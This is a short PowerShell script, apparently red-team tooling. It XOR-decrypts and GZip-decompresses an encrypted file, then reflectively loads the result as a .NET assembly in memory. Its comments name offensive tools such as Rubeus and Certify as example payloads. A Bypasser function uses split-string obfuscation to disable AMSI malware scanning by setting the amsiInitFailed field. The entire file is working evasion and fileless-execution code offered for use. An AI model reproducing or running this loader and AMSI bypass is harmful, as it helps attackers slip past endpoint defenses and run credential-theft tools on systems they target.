# Xor decrypt -> GZip decompress -> Reflective load
# AMSI scans buffer on load. Calls a bypass before load.
Function Loader {
    param(
         [Parameter()]
         [string]$File
    )

    if (!($File)) {
        $File = Read-Host "Encrypted File path"
    }

    $byteArray = Get-Content $File -Encoding Byte
    $tmp = @();
    $key = "white-hat"
    for ($i = 0; $i -lt $byteArray.Count; $i++) {
        $tmp += $byteArray[$i] -bxor $key[$i % $key.Length];
    }
    $GUNZIP = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String([Convert]::ToBase64String($tmp)), [IO.Compression.CompressionMode]::Decompress)
    $uncompressed = New-Object Byte[](17920) # (Statically) put the size of the ORIGINAL exe file (dunno how to make it dynamic here).
    $GUNZIP.Read($uncompressed, 0, 17920) | Out-Null # Put the size of the ORIGINAL exe file.
    Bypasser
    [System.Reflection.Assembly]::Load($uncompressed)
    [Namespace.Program]::CommandEntry($args) # [Namespace.Class]::Function(args) Examples: [C3rt1fy.Program]::main(@(arg1, arg2)) , [R8b38s.Program]::Main($Command.Split(" "))
}

Function Bypasser {
    $a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'s'+'iU'+'tils')
    $b = $a.GetField('ams'+'iIn'+'itFa'+'iled','NonPu'+'blic,St'+'atic')
    iex('$b.Se'+'tVa'+'lue($null,$true)')
}
